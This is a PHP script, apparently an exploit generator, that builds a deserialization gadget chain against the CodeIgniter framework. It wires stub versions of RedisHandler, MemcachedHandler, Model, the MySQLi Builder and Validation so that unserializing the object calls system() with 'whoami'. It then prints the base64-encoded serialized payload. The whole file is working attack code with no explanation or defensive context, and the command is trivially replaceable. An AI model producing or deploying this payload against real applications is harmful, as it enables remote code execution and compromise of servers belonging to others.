<?php

namespace CodeIgniter\Cache\Handlers{
    class RedisHandler{
        function __construct($class)
        {
            $this->redis = $class; //new CodeIgniter\Session\Handlers\MemcachedHandler($model)
        }
    }
}

namespace CodeIgniter\Session\Handlers{
    class MemcachedHandler{
        function __construct($class)
        {
            $this->lockKey = array(
                "xx" => "whoami"
            ); //$id
            $this->memcached = $class; //new CodeIgniter\Model($basebuilder, $validation)
        }
    }
}


namespace CodeIgniter{
    class Model{
        function __construct($class1, $class2)
        {
            $this->tempAllowCallbacks = true;
            $this->beforeDelete = array('validate');
            $this->validationRules = array(
                "id.xx" => array(
                    "system"
                )
            );
            $this->skipValidation = false;
            $this->cleanValidationRules = false;
            $this->validationMessages = array();
            $this->primaryKey = "a";
            $this->builder = $class1;  //new CodeIgniter\Database\MySQLi\Builder($connection)
            $this->validation = $class2;  //new CodeIgniter\Validation\Validation()
        }
    }
}

namespace CodeIgniter\Database\MySQLi{
    class Builder{
        function __construct($class)
        {
            $this->db = $class;  //new CodeIgniter\Database\MySQLi\Connection()
        }
    }
    class Connection{
        function __construct()
        {
            $this->protectIdentifiers = false;
        }
    }
}

namespace CodeIgniter\Validation{
    class Validation{
        function __construct(){
            $this->ruleSetFiles = array("Config\Database");
        }
    }
}

namespace{
    $connection = new CodeIgniter\Database\MySQLi\Connection();
    $basebuilder = new CodeIgniter\Database\MySQLi\Builder($connection);
    $validation = new CodeIgniter\Validation\Validation();
    $model = new CodeIgniter\Model($basebuilder, $validation);
    $MemcachedHandler = new CodeIgniter\Session\Handlers\MemcachedHandler($model);
    $handles = new CodeIgniter\Cache\Handlers\RedisHandler($MemcachedHandler);
    echo base64_encode(serialize($handles));
}